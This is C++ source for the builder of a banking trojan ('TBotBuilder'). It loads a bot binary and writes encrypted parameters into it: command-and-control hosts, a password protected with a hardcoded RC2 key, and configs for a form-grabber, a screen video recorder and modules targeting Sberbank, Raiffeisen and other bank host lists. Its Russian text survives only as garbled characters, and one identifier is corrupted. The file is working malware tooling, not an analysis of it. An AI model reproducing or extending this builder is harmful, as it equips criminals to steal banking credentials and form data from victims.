//---------------------------------------------------------------------------


#pragma hdrstop

#include "SysUtils.hpp"
#include "BuilderUtils.h"
#include "Memory.h"
#include "Crypt.h"
#include "Strings.h"

#include "Config.h"
#include "Hunter.h"
#include "JavaConfig.h"
#include "VideoRecorder.h"
#include "FgrFilters.h"
#include "AzConfig.h"
#include "Sber.h"
#include "Rafa.h"
#include "cc.h"

//---------------------------------------------------------------------------

const PCHAR KeyForKey = "AUvS8jou0Z9K7Bf9";



PCHAR Error_UnknownMae = "�� ������� ���";
PCHAR Error_MemAlloc = "������ ��������� ������!";
PCHAR Error_NoSourceFile = "�������� ���� �� ������!";
PCHAR Error_BigParamDataSize = "������� ��������� ������� ������� ���� ������ ��� ���������";
PCHAR Error_InvalidParamsFile = "���� �� �������� ������ ���������� ��� �������� ������!";
PCHAR Error_UnknownResultFileName = "�� ������� ��� ��������� �����";
PCHAR Error_DataSizeError = "������� �������� ������� ������� ���� ������";
PCHAR Error_BigPassword = "������� ������� ���� ����������";

PCHAR ParamStatus_Warning = "��������������: ";
PCHAR ParamStatus_Error   = "������:         ";

PCHAR StrNoParamValue = "�� ����������� �������� ��������� \r\n --";

PCHAR ParamTitle_Hosts        = "�������� ����� ����";
PCHAR ParamTitle_BankHosts    = "����� ������ BANKING";
PCHAR ParamTitle_Prefix       = "������� ����";
PCHAR ParamTitle_Delay        = "�������� �������";
PCHAR ParamTitle_Password     = "���� ����������";



// UnicodeString Status_ = "";
UnicodeString Status_Ok = "OK";
UnicodeString Status_Error = "������";
UnicodeString Status_StartBuild = "������ ������";
UnicodeString Status_CheckParams = "��������� ���������";
UnicodeString Status_WriteParams = "���������� ���������:";
UnicodeString Status_WriteParam = "====> ";
UnicodeString Status_SaveFile = "��������� ���� ";
UnicodeString Status_BuildCompleted = "������ ������� ���������";

bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
									bool CryptLines, bool TrimLines,
									PCHAR &OutBuf, DWORD &OutBufSize)
{
	//  ������� ����������� ������ � ���� ������. ������ ������ �����
	//  �������� ������� ��������. � ����� ��������� ������ ����� ������
	//  ��� ������� �������. ������ ������ ����� ���������������.

	if (Lines == NULL || Lines->Count == 0)
		return false;

	OutBuf = NULL;
	OutBufSize = 0;


	UnicodeString S;


	// ���������� ����� ������ � ������� ������ ������
	for (int i = Lines->Count - 1; i >= 0; i--)
    {
		S = Lines->Strings[i];
		DWORD OldLength = S.Length();

		if (TrimLines)
			S = S.Trim();

		if (S.Length() == 0)
			Lines->Delete(i);
		else
		{
			if (TrimLines && S.Length() != OldLength)
				Lines->Strings[i] = S;
			OutBufSize += S.Length() + 1;
        }
	}
	if (OutBufSize == 0) return false;

	OutBufSize++; // ����������� ����� ��� ��������������� ����

	// �������� ������
	OutBuf = (PCHAR)MemAlloc(OutBufSize);
	if (OutBuf == NULL)
	{
		throw Exception(Error_MemAlloc);
    }

    PCHAR Tmp = OutBuf;

	// �������� ������
	for (int i = 0; i < Lines->Count; i++)
    {
		S = Lines->Strings[i];
		// �������� ������
		DWORD SL = S.Length();
		PCHAR Line = NULL;

		if (CryptLines)
		{
			Line = STR::Alloc(SL);
			Decrypt(AnsiString(S).c_str(), Line);
		}
		else
			Line = AnsiString(S).c_str();

		m_memcpy(Tmp, Line, SL);

		if (CryptLines)
			STR::Free(Line);

		// ������� ���������
		Tmp += SL;
		*Tmp = 0;
		Tmp++;
	}

	// ��������� �������������� ����
	*Tmp = 0;

	return true;
}


//****************************************************************************
//                             TBotBuilder
//****************************************************************************


#define BUILDER_FILE_SIGNATURE 0x91A3A08A /* BOT_BUILDER_FILE */

struct TBuilderFileHeader
{
	DWORD Signature;
	DWORD Version;
	DWORD Count;
};


__fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
	: TComponent(AOwner)
{
	FFile = new TMemoryStream();
	FParams = new TCollection(__classid(TBotParam));
	FModules = new TCollection(__classid(TBotModule));
	FActiveModules = new TList();

	// ��������� �������� ���������
	FPrefix    = new TBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
	FHosts     = new TBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
	FDelay     = new TBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
	FPassword  = new TBotPassword(this, true, true, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, ParamTitle_Password);


	// Hunter
	TBotModule* Module = AddModule(Module_BankHosts);
	Module->AddParam(true, BOTPARAM_ENCRYPTED_BANKHOSTS, BOTPARAM_BANKHOSTS, MAX_BANKHOSTS_BUF_SIZE, ParamTitle_BankHosts);



	FDelay->AsLong = DEFAULT_DELAY;

    InitializeModules();

}

__fastcall TBotBuilder::~TBotBuilder()
{
	delete FParams;
	delete FModules;
	delete FActiveModules;
	delete FFile;
}

// ������� ��������� �������� ����
void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
{
	FFile->Size = 0;
	FSourceFileName = "";
	UpdateResultFileName(true);
	DeactivateModules();


	TFileStream* S = new TFileStream(FileName, fmOpenRead);
	try {
		FFile->LoadFromStream(S);
		FFile->Position = 0;
	} __finally {
		delete S;
	}



	FSourceFileName = FileName;
	UpdateResultFileName(false);
	ActivateModules();
}

//-----------------------------------------------------
// Build - ������� �������� ������
//
// FullBuild  �������� ���������, ��� ���������� ������
//            ������, ��� ������� �������� ����������
//            Enabled ����� ��������������
//-----------------------------------------------------
 bool __fastcall TBotBuilder::Build(bool FullBuild)
{
	if (FFile->Size == 0)
		throw Exception(Error_NoSourceFile);

    Message(Status_StartBuild);

	// ��������� ���������
	Message(Status_CheckParams);

	TStringList* Errors = new TStringList();

	TBotParamStatus Status = CheckParams(Errors, FullBuild);

	UnicodeString ErrorText = Errors->Text;
    delete Errors;

	if (Status == psOk)
		Message(Status_Ok);
	else
	{
		Message(Errors);

		if (Status == psError)
            throw Exception(ErrorText);
    }


	if (FResultFileName.IsEmpty())
		throw Exception(Error_UnknownResultFileName);

	// ����������

	TMemoryStream *Mem = new TMemoryStream();
	try {

		// ��������� ����
		FFile->Position = 0;
		Mem->LoadFromStream(FFile);

		Mem->Position = 0;
		FFile->Position = 0;

        Message(Status_WriteParams);

		// ���������� ���������
		DWORD Count   = FParams->Count;
		PCHAR Buf     = (PCHAR)Mem->Memory;
		DWORD BufSize = Mem->Size;
		for (int i = 0; i < Count; i++)
		{
			TBotParam* Param = (TBotParam*)FParams->Items[i];

			if (Param->Active)
			{
				if ((FullBuild || Param->Enabled))
					WriteParametr(Buf, BufSize, Param);
				else
				{
					// �������� ��������, �������� ��� ����� ������
					Param->WriteEmptyData(Buf, BufSize);
                }
			}
		}


		// ��������� ����
		Message(Status_SaveFile + FResultFileName);
		TFileStream *File = new TFileStream(FResultFileName, fmCreate);
		try {

			File->Write(Mem->Memory, Mem->Size);

		} __finally{
			delete File;
		}


	} __finally {
		delete Mem;
	}

	Message("");
    Message(Status_BuildCompleted);

	return true;
}
//-----------------------------------------------------------------

//-----------------------------------------------------------------
int __fastcall TBotBuilder::GetCount()
{
	return FParams->Count;
}
//-----------------------------------------------------------------

TBotParam* __fastcall TBotBuilder::GetParam(int Index)
{
	return (TBotParam*)FParams->Items[Index];
}
//-----------------------------------------------------------------

// ������� ���������� ������ � �����
void __fastcall TBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* Param)
{
    Message(Status_WriteParam + Param->DisplayName);
	bool Result = Param->Write(Buf, BufSize);
	if (Result)
		Message(Status_Ok);
	else
		Message(Status_Error);
}


// ������� ��������� ��������� ����������
TBotParamStatus __fastcall TBotBuilder::CheckParams(TStrings* Errors, bool FullBuild)
{
	TBotParamStatus Result = psOk;

	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* Param = (TBotParam*)FParams->Items[i];
		bool UseParam = Param->Active && (FullBuild || Param->Enabled);
		if (!UseParam) continue;

		TBotParamStatus Status = Param->Status();
		if (Status == psOk) continue;

		// ����� ������� �������� ������� ��������
		// ������� ����������� ���������
		if (Status > Result)
			Result = Status;

		// ��������� ������
		if (Errors)
		{
			UnicodeString Str;
			switch (Status) {
				case psWarning: Str = ParamStatus_Warning; break;
				case psError:   Str = ParamStatus_Error; break;
			}

			Str += StrNoParamValue;
			Str += Param->DisplayName;

			Errors->Add(Str);
        }
	}

	return Result;
}


// ������� ���������� ����� ��������� �������� ���������
void __fastcall TBotBuilder::ParamValueChanged(TBotParam* Sender)
{
	if (Sender == FPrefix)
	{
		// �������� �������, ������ ��� ��������������� �����
		UpdateResultFileName(false);
    }
}

// ������� �������� ��� ��������������� �����
void __fastcall TBotBuilder::UpdateResultFileName(bool Reset)
{
	// ���������� ���������
	if (Reset)
	{
		FResultFileName = "";
		FResultFileNameChanged = false;
        return;
	}

	// ���� ��� ����� �������� ������������� �� �������
	if (FResultFileNameChanged) return;

	if (FSourceFileName.IsEmpty() || FPrefix->IsEmpty())
	{
		// ������� �� ����������
		FResultFileName = "";
		return;
    }

	// �������� ���
	UnicodeString Path = ExtractFilePath(FSourceFileName);
	UnicodeString Ext  = ExtractFileExt(FSourceFileName);

	FResultFileName = Path + FPrefix->AsUnicodeString + Ext;
}


void __fastcall TBotBuilder::ClearParams()
{
	// ������� ������� ������ ����������
	for (int i = 0; i < FParams->Count; i++)
		((TBotParam*)FParams->Items[i])->Clear();
}


void __fastcall TBotBuilder::SaveToStream(TStream *Stream)
{

	// ���������� �������� �����
	TBuilderFileHeader H;
	H.Signature = BUILDER_FILE_SIGNATURE;
	H.Version   = BUILDER_VERSION;
	H.Count     = FParams->Count;

	Stream->Write(&H, sizeof(H));

	// ���������� ���������
	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* P = (TBotParam*)FParams->Items[i];
		DWORD NameLen = P->FName.Length();

		// ���������� ��� ��������
		Stream->Write(&NameLen, sizeof(NameLen));

		AnsiString Name = P->FName;
		Name.Unique();
		Decrypt(Name.c_str(), Name.c_str());

		Stream->Write(Name.c_str(), NameLen);

		// ���������� ������ ���������
        P->SaveToStream(Stream);
	}
}


void __fastcall TBotBuilder::LoadFromStream(TStream *Stream)
{
	// ��������� ��������� �� ������ ������
	ClearParams();

	// ������ ���������
	TBuilderFileHeader H;

	int Readed = Stream->Read(&H, sizeof(H));

	// ��������� ������������ ���������
	if ( Readed < sizeof(H) || H.Signature != BUILDER_FILE_SIGNATURE)
		throw Exception(Error_InvalidParamsFile);

    // ��������� ��������� ����������
	for (DWORD i = 0; i < H.Count; i++)
	{
		// ������ ��� ���������
		DWORD NameLen = 0;
		Stream->Read(&NameLen, sizeof(NameLen));

		AnsiString Name;
		Name.SetLength(NameLen);
		Readed = Stream->Read(Name.c_str(), NameLen);
		if (Readed != NameLen)
			throw Exception(Error_InvalidParamsFile);

		Decrypt(Name.c_str(), Name.c_str());

		// ������ ������ ���������
		TBotParam* Param = ParamByName(Name);
		if (Param)
			Param->LoadFromStream(Stream);
		else
		{
			// �������� �� ������, ���������� ����
			DWORD Size = 0;
			Stream->Read(&Size, sizeof(Size));
			Stream->Position = Stream->Position + Size;
        }
	}

	UpdateResultFileName(false);
}


void __fastcall TBotBuilder::SaveToFile(const UnicodeString &FileName)
{
	TFileStream *S = new TFileStream(FileName, fmCreate);
	try {

		SaveToStream(S);

	} __finally
	{
		delete S;
	}
}


void __fastcall TBotBuilder::LoadFromFile(const UnicodeString &FileName)
{
	TFileStream *S = new TFileStream(FileName, fmOpenRead);
	try {

		LoadFromStream(S);

	} __finally
	{
		delete S;
	}
}


TBotParam* _fastcall TBotBuilder::ParamByName(const AnsiString &Name)
{
	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* P = (TBotParam*)FParams->Items[i];
		if (P->FName == Name)
			return P;
	}
	return NULL;
}


void __fastcall TBotBuilder::Message(const UnicodeString &Message)
{
	if (FOnMessage)
		FOnMessage(this, Message);
}


void __fastcall TBotBuilder::Message(TStrings *Messages)
{
	int Count = Messages->Count;
	for (DWORD i = 0; i < Count; i++)
		Message(Messages->Strings[i]);
}


TBotModule* __fastcall TBotBuilder::AddModule(const char *Name)
{
	return new TBotModule(this, Name);
}


void __fastcall TBotBuilder::ActivateModules()
{
	// ������� ���������� ����������� ������
	int Count = FModules->Count;
	for (int i = 0; i < Count; i++)
	{
		TBotModule* Module = (TBotModule*)FModules->Items[i];
		if (Module->Activate((PCHAR)FFile->Memory, FFile->Size))
        	FActiveModules->Add(Module);
	}
}


void __fastcall TBotBuilder::DeactivateModules()
{
	// ������� ������������ ������
	for (int i = FActiveModules->Count - 1; i >= 0; i--)
	{
		TBotModule* Module = (TBotModule*)FActiveModules->Items[i];
		Module->FActive = false;
		FActiveModules->Delete(i);
	}

}

int __fastcall TBotBuilder::GetActiveModulesCount()
{
	return FActiveModules->Count;
}


TBotModule* __fastcall TBotBuilder::GetActiveModules(int Index)
{
	return (TBotModule*)FActiveModules->Items[Index];
}


void __fastcall TBotBuilder::SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit)
{
	TBotModule* Module = ModuleByName(Name);
	if (Module)
        Module->FEdit = Edit;
}


TBotModule*__fastcall TBotBuilder::ModuleByName(const UnicodeString &Name)
{
    int Count = FModules->Count;
	for (int i = 0; i < Count; i++)
	{
		TBotModule* Module = (TBotModule*)FModules->Items[i];
		if (Module->Name == Name)
			return Module;
	}

	return NULL;
}



//-----------------------------------------------------------------------------
//                  ������������� ������� ����
//-----------------------------------------------------------------------------


void __fastcall TBotBuilder::InitializeModules()
{
	TBotModule* Module;


    // Hunter
	Module = AddModule(Module_Hunter);
    Module->AddParam(false, HUNTER_PARAM_ENCRYPTED, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, "������ ������ Hunter");

    // ��������� �����������
	Module = AddModule(Module_FormGraber);
	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_URLS, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, "������ �����������");
	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, "����� ���� ������");

	// �������������
	Module = AddModule(Module_VideoRecorder);
	Module->AddParam(true,  VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, "������ ������ ����� �1");
	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, "������ ������ ����� �2");
	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_URLS, VIDEOREC_PARAM_NAME_URLS,  VIDEOREC_PARAM_SIZE_URLS, "������ ������ �������� �����");

	// JAVA Config
	Module = AddModule(Module_JavaConfig);
	Module->AddParam(true, JAVA_PARAM_ENCRYPTED, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, "������ JAVA");

	// Ccskrb AZ
	Module = AddModule(Module_AzConfig);
	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "����� ������� AZ");
	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "����� Java �������� ������� AZ");

	// ��������� ������� ����
	Module = AddModule(Module_SberHosts);
	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "����� ������� SBER");


	Module = AddModule(Module_RafaHosts);
	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "����� ������� RAFA");

	Module = AddModule(Module_CCHosts);
	Module->AddParam(true, ��HOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "����� ������� CC");
}



//****************************************************************************
//                             TBotParam
//****************************************************************************
__fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted,
	const char* Name, DWORD Size, const char* Title)
	: TCollectionItem(AOwner->FParams)
{
	if (STRA::IsEmpty(Name))
		throw Exception("Unknown param name!");

	if (Size == 0)
		throw Exception("Unknown param size!");

	FEnabled = true;
	FEncrypted = Encrypted;
	FOwner = AOwner;
	FTitle = Title;
	FName = Name;
	FNotNull = NotNull;
	// ��� ��� ����������� ���������� �������� ����������, ��
	// ������ ������ ������������� � ������ ������������ ����
	FSize = Size - 1;
	FDataSize = 0;
	FDataSize = 0;
	FData = (PCHAR)malloc(FSize);
	if (!FData)
		throw Exception(Error_MemAlloc);

    m_memset(FData, 0, FSize);
}


__fastcall TBotParam::~TBotParam()
{
	free(FData);
	if (FModule)
		FModule->FParams->Remove(this);
}

bool __fastcall TBotParam::GetActive()
{
	return FModule == NULL || FModule->Active;
}

// ������� ���������� ��������� ��������
TBotParamStatus __fastcall TBotParam::Status()
{
	if (FModule && !FModule->Active)
		return psOk;

	if (IsEmpty())
	{
		if (FNotNull)
			return psError;
		else
			return psWarning;
	}
	return psOk;
}


// ������� ���������� ������������ ��� ���������
UnicodeString __fastcall TBotParam::GetDisplayName(void)
{
	if (FTitle.IsEmpty())
		return FName;
	else
		return FTitle;
}

// ������� ���������� ������ ���� �������� ������
bool __fastcall TBotParam::IsEmpty()
{
	return FDataSize == 0;
}

// ������� ������� ��������
void __fastcall TBotParam::Clear()
{
	FDataSize = 0;
	m_memset(FData, 0, FSize);
}


// ������� ������������� �������� ���������
void __fastcall TBotParam::SetValue(PCHAR Value, DWORD ValueSize)
{
	Clear();

	if (Value && !ValueSize)
		ValueSize = STRA::Length(Value);

	if (ValueSize > FSize)
		throw Exception(Error_DataSizeError);

	if (Value && ValueSize)
	{
		m_memcpy(FData, Value, ValueSize);
		FDataSize = ValueSize;
		if (FEncrypted)
            Decrypt(FData, FData);
	}

	Changed();
}


void __fastcall TBotParam::DoChanged()
{

}

void __fastcall TBotParam::Changed()
{
	DoChanged();
	FOwner->ParamValueChanged(this);
}


AnsiString __fastcall TBotParam::GetAsAnsiString()
{
	AnsiString S = FData;
	if (FEncrypted)
		Decrypt(S.c_str(), S.c_str());
	return S;
}

void __fastcall TBotParam::SetAsAnsiString(const AnsiString &Value)
{
    SetValue(Value.c_str(), Value.Length());
}


UnicodeString __fastcall TBotParam::GetAsUnicodeString()
{
	return AsAnsiString;
}

void __fastcall TBotParam::SetAsUnicodeString(const UnicodeString &Value)
{
	AsAnsiString = Value;
}

DWORD __fastcall TBotParam::GetAsLong()
{
	int Result = 0;
	if (FDataSize)
		TryStrToInt(AsUnicodeString, Result);
	return Result;
}

void __fastcall TBotParam::SetAsLong(DWORD Value)
{
	AnsiString S(Value);
	SetValue(S.c_str(), S.Length());
}


void __fastcall TBotParam::SaveToStream(TStream *Stream)
{
	// ������� ��������� ������ � �����
	Stream->Write(&FDataSize, sizeof(FDataSize));
	if (FDataSize)
		Stream->Write(FData, FDataSize);

}

void __fastcall TBotParam::LoadFromStream(TStream *Stream)
{
	// ������� ��������� ������ �� ������
	Clear();
	DWORD Size = 0;
	Stream->Read(&Size, sizeof(Size));

	if (Size > FSize)
		throw Exception(Error_BigParamDataSize);

	if (Size)
	{
		FDataSize = Size;
		Stream->Read(FData, Size);
    }
}


UnicodeString __fastcall TBotParam::GetAsStrings()
{
	// ������� ���������� ������������� �����
	if (FDataSize == 0)
		return "";

	TStringList *S = new TStringList();

	SaveToStrings(S);

	UnicodeString R = S->Text;
	delete S;
	return R;

}


void __fastcall TBotParam::SetAsStrings(const UnicodeString &Value)
{
	if (Value.Length() == 0)
	{
		Clear();
		return;
	}

	TStringList *S = new TStringList();
	S->Text = Value;

	LoadFromStrings(S);

	delete S;
}

void __fastcall TBotParam::SaveToStrings(TStrings *Strings)
{
	// ������� ��������� ������ � ����� �����,
	// ���������������, ��� ������ ��� ����� ����� ���������� ����
	Strings->Clear();
	Strings->BeginUpdate();
	try {


		if (FDataSize)
		{
			TStrEnum E(FData, FEncrypted, 0);
			while (E.Next())
			{
				Strings->Add(E.Line().t_str());
			}
		}

	} __finally {
		Strings->EndUpdate();
	}

}

void __fastcall TBotParam::LoadFromStrings(TStrings *Strings)
{
	// ������� ������ ������ �� ������ �����,
	// ���������������, ��� ������ ��� ����� ����� ���������� ����
	Clear();

	int Count = Strings->Count;

    PCHAR Buf = FData;

	for (int i = 0; i < Count; i++)
	{
		AnsiString S = Strings->Strings[i].Trim();
		DWORD Len = S.Length();
		if (Len == 0) continue;

		Len++;// ������� ���� � �����

		// ��������� ���������� �� ���� ������
		if (FDataSize + Len >= FSize)
			return;

		// ��� ������������� ������� ������
		if (FEncrypted)
			Decrypt(S.c_str(), S.c_str());

		// �������� ������
		m_memcpy(Buf, S.c_str(), Len);

		Buf += Len;
		FDataSize += Len;
	}
}


bool __fastcall TBotParam::Write(PCHAR Buf, DWORD BufSize)
{
	// ������� ���������� ��� �������� � �����
	return DoWrite(Buf, BufSize, FData, FSize);
}

bool __fastcall TBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
{
	// ������� ��������� ������ ��� ����� � ������
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;

	m_memset(Buf + Pos, 0, FSize);
	return true;
}


int  __fastcall TBotParam::Position(PCHAR Buf, DWORD BufSize)
{
	// ������� ���������� ������� ��������� � ������
	return STR::Pos(Buf, FName.c_str(), BufSize);
}


bool __fastcall TBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize)
{
	// ���� �������
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;

	// ���������� ������
	m_memcpy(Buf + Pos, AData, ADataSize);
	return true;
}


//****************************************************************************
//                             TBotPassword
//****************************************************************************

__fastcall TBotPassword::TBotPassword(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)

	// �������� ������������ ����������� �� ��������� ��, ���
	// ������������ �������� ����� ������������ � ����� � BASE64
	// ���������. ����������� ����� � �������, �� ��������� ������
	// ������ � ����
	: TBotParam(AOwner, NotNull, Encrypted, Name, Size * 3 + 128, Title)

{
	FRealSize = Size;
}



bool __fastcall TBotPassword::Write(PCHAR Buf, DWORD BufSize)
{
	// ����� ������� ����� �������������� ���;
	AnsiString Key;
	Key.SetLength(FRealSize);

	// �������������� ������
	if (!IsEmpty())
	{

		PCHAR Str = STR::New(AsAnsiString.c_str());
		DWORD Size = 0;
		RC2Crypt::Decode(KeyForKey, Str, Size);
		if (Size >= FRealSize)
			throw Exception(Error_BigPassword);

        m_memset(Key.c_str(), 0, FRealSize);
		m_memcpy(Key.c_str(), Str, Size);

		if (Encrypted)
			Decrypt(Key.c_str(), Key.c_str());
    }

    DoWrite(Buf, BufSize, Key.c_str(), Key.Length());
}


bool __fastcall TBotPassword::WriteEmptyData(PCHAR Buf, DWORD BufSize)
{
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;

	m_memset(Buf + Pos, 0, FRealSize);
	return true;
}

//****************************************************************************
//                             TBotModule
//****************************************************************************
__fastcall TBotModule::TBotModule(TBotBuilder* AOwner, const char *Name)
	: TCollectionItem(AOwner->FModules)
{
	if (STRA::IsEmpty(Name))
		throw Exception(Error_UnknownMae);

    FBuilder = AOwner;
	FName = Name;
	FParams = new TList();
}


__fastcall TBotModule::~TBotModule()
{
	delete FParams;
}


TBotParam* __fastcall TBotModule::AddParam(bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
{
	TBotParam* Param = new TBotParam(FBuilder, NotNull, Encrypted, Name, Size, Title);
	FParams->Add(Param);
	Param->FModule = this;
    return Param;
}

bool __fastcall TBotModule::CanEdit()
{
	return FParams->Count && FEdit;
}


bool __fastcall TBotModule::Edit()
{
	if (FEdit)
		return FEdit->Execute(this);
}


bool __fastcall TBotModule::Activate(PCHAR Buf, DWORD BufSize)
{
	// ������� ���������� ������
	FActive = false;
	for (int i = 0; i < ParamsCount; i++)
	{
		if (Params[i]->Position(Buf, BufSize) >= 0)
		{
			FActive = true;
			return true;
        }
	}

	return false;
}


int __fastcall TBotModule::GetParamsCount()
{
	return FParams->Count;
}

TBotParam* __fastcall TBotModule::GetParams(int Index)
{
	return (TBotParam*)FParams->Items[Index];
}


TBotParam* __fastcall TBotModule::ParamByName(const AnsiString &Name)
{
	// ������� ���������� �������� �� ��� �����
	for (int i = 0; i < ParamsCount; i++)
	{
		TBotParam *P = Params[i];
		if (P->FName == Name)
		{
			return P;
        }
	}

	return NULL;
}
